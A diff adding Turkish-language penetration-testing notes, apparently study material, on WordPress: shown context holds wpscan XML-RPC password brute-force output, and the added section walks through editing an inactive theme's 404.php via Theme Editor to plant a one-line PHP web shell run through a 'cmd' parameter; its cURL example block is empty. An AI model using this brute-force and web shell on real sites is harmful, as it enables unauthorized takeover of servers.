@@ -603,3 +603,43 @@ wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.t
 Trying david / Spring2016 Time: 00:00:01 <============> (474 / 474) 100.00% Time: 00:00:01
 [i] Valid Combinations Found: 
 | Username: admin, Password: sunshine1
+
+
+
+# 👑 WordPress Tema Düzenleyici ile RCE (Remote Code Execution)
+
+WordPress üzerinde yönetici (administrator) yetkilerine sahip olunduğunda, PHP kaynak kodları doğrudan değiştirilerek sistem komutları çalıştırılabilir (RCE). 
+
+## 🛠️ Saldırı Adımları
+
+1. **Yönetim Paneline Giriş:** Yönetici kimlik bilgileriyle WordPress'e giriş yapılır.
+2. **Tema Düzenleyiciye Erişim:** Sol menüden **Appearance (Görünüm)** > **Theme Editor (Tema Düzenleyici)** seçilir. Bu sayfa PHP dosyalarını doğrudan düzenlemeye izin verir.
+3. **Pasif Tema Seçimi:** Ana temayı bozmamak için aktif olmayan (örneğin `Twenty Seventeen` gibi) kullanılmayan bir tema seçilmelidir.
+4. **Dosya Düzenleme:** Değişiklik yapmak ve bir web shell eklemek için `404.php` gibi kritik olmayan bir dosya seçilir.
+
+---
+
+## 💉 PHP Dosyasına Web Shell Ekleme
+
+Seçilen `404.php` dosyasının en üstüne (veya uygun bir yerine) sistem komutlarını çalıştıracak aşağıdaki PHP fonksiyonu eklenir:
+
+```php
+<?php system($_GET['cmd']); ?>
+/**
+ * The template for displaying 404 pages (not found)
+ *
+ * @link [https://codex.wordpress.org/Creating_an_Error_404_Page](https://codex.wordpress.org/Creating_an_Error_404_Page)
+ * <SNIP>
+```
+
+**Nasıl Çalışır?** Bu kod, URL üzerinden `cmd` GET parametresi ile gönderilen işletim sistemi komutlarını doğrudan çalıştırır. (Örn: `404.php?cmd=id`).
+
+## 🎯 RCE Doğrulama ve Komut Çalıştırma
+
+Kod kaydedildikten sonra, değiştirilen dosyanın yoluna giderek RCE'nin başarılı olup olmadığı doğrulanabilir. Tarayıcı üzerinden veya terminalden `cURL` ile istek atılabilir.
+
+**Örnek cURL İsteği:**
+
+```
+
+```
